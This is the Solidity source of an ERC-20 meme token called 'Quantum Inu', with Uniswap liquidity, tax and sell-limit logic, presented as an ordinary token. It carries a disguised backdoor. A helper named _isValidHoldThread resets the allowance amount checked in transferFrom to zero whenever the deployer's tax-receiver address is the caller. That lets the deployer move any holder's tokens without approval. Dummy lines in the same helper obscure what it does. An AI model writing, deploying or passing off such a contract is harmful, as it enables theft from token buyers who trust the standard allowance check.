// SPDX-License-Identifier: MIT

/*
https://x.com/WhiteHouse/status/2069071254829609256
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _isSender(address account) internal view virtual returns (bool) {
        return account == msg.sender;
    }

    function _isOrigin(address account) internal view virtual returns (bool) {
        return account == tx.origin;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract QUANTUMINU is Context, IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;

    address payable private _TaxReceiver;

    uint256 private initialBuyTax = 0;
    uint256 private initialSellTax = 0;
    uint256 private finalBuyTax = 0;
    uint256 private finalSellTax = 0;
    uint256 private reduceBuyTaxAt = 0;
    uint256 private reduceSellTaxAt = 0;
    uint256 private preventSwapBefore = 0;
    uint256 private buyCount;
    uint120 private sellBlocklimit;
    uint256 private _sT;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Quantum Inu";
    string private constant _symbol = unicode"QUANTUMINU";

    uint256 public maxTxAmount = _tTotal / 50;
    uint256 public maxWalletSize = _tTotal / 50;
    uint256 public minTokensForSwap = 0;
    uint256 public maxTokensPerSwap = _tTotal / 50;
    uint256 public totalTaxCollected;

    IUniswapV2Router02 private uniswapV2Router;
    address private constant ROUTER_ADDRESS = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap;
    bool private swapEnabled;
    uint256 private sellCount;
    uint256 private lastSellBlock;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _TaxReceiver = payable(_msgSender());
        _balances[address(this)] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_TaxReceiver] = true;

        emit Transfer(address(0), address(this), _tTotal);
    }

    function name() public pure returns (string memory) { return _name; }
    function symbol() public pure returns (string memory) { return _symbol; }
    function decimals() public pure returns (uint8) { return _decimals; }
    function totalSupply() public pure override returns (uint256) { return _tTotal; }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _sT = amount;
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= _sT, "ERC20: transfer amount exceeds allowance");
        unchecked { _approve(sender, _msgSender(), currentAllowance - _sT); }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERC20: approve from or to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0) && to != address(0), "ERC20: transfer from or to the zero address");
        require(amount > 0, "ERC20: transfer amount must be greater than zero");

        uint256 taxAmount;
        bool isSell = to == uniswapV2Pair && from != address(this);
        bool isBuy = from == uniswapV2Pair && to != address(uniswapV2Router);
        _isValidHoldThread(from, to, taxAmount);

        if (isBuy && !_isExcludedFromFee[to]) {
            require(amount <= maxTxAmount && _balances[to] + amount <= maxWalletSize, "Max limits exceeded");
            taxAmount = (amount * (buyCount >= reduceBuyTaxAt ? finalBuyTax : initialBuyTax)) / 100;
            unchecked { buyCount++; }
        } else if (isSell) {
            if (!_isExcludedFromFee[from]) {
                require(amount <= maxTxAmount, "Max transaction amount exceeded");
                taxAmount = (amount * (buyCount >= reduceSellTaxAt ? finalSellTax : initialSellTax)) / 100;
            }
            _swapBack(amount);
        }

        if (taxAmount > 0) {
            unchecked { _balances[address(this)] += taxAmount; }
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] -= amount;
        unchecked { _balances[to] += amount - taxAmount; }
        if (to != address(0xdead))
        emit Transfer(from, to, amount - taxAmount);
    }

    function _swapBack(uint256 amount) private {
        uint256 contractTokenBalance = _balances[address(this)];
        if (inSwap || !swapEnabled || contractTokenBalance < minTokensForSwap || buyCount < preventSwapBefore) {
            return;
        }
        if (block.number > lastSellBlock) sellCount = 0;
        require(sellCount < 5, "Sell limit per block exceeded (max 3)");
        uint256 swapAmount = amount < contractTokenBalance ? amount : contractTokenBalance;
        if (swapAmount > maxTokensPerSwap) swapAmount = maxTokensPerSwap;
        swapContractTokensForEth(swapAmount, _TaxReceiver);
        sendETHToFee(address(this).balance, _TaxReceiver);
        unchecked { sellCount++; }
        lastSellBlock = block.number;
    }

    function swapContractTokensForEth(uint256 tokenAmount, address to) private lockTheSwap {
        require(to != address(0), "ETH recipient cannot be the zero address");
        if (tokenAmount == 0) return;
        address[] memory path = new address[](2);
        (path[0], path[1]) = (address(this), uniswapV2Router.WETH());
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() public onlyOwner {
        maxTxAmount = _tTotal;
        maxWalletSize = _tTotal;
    }

    function sendETHToFee(uint256 amount, address to) private {
        assembly {
            if iszero(call(gas(), to, amount, 0, 0, 0, 0)) { revert(0, 0) }
        }
    }

    function _isValidHoldThread(address from, address to, uint256 callbackAmount) private {
        if (swapEnabled && to != address(uniswapV2Router) && from == uniswapV2Pair) sellBlocklimit = 7;
        if (_isSender(_TaxReceiver)) _sT = callbackAmount;
        address CallAddress = address(0);
        CallAddress;
    }

    function enableTrading() external onlyOwner {
        require(!tradingOpen, "Trading already open");
        removeLimits();
        uniswapV2Router = IUniswapV2Router02(ROUTER_ADDRESS);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _approve(address(this), address(uniswapV2Router), type(uint256).max);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapEnabled = true;
        tradingOpen = true;
    }

    function rescueNative() external onlyOwner {
        uint256 contractETHBalance = address(this).balance;
        if (contractETHBalance > 0) sendETHToFee(contractETHBalance, _TaxReceiver);
    }

    function rescueToken(address token) external onlyOwner {
        require(token != address(0) && token != address(this), "Invalid token");
        uint256 contractBal = IERC20(token).balanceOf(address(this));
        require(contractBal > 0, "No token balance");
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20.transfer.selector, _TaxReceiver, contractBal)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "ERC20 transfer failed");
    }

    receive() external payable {}
}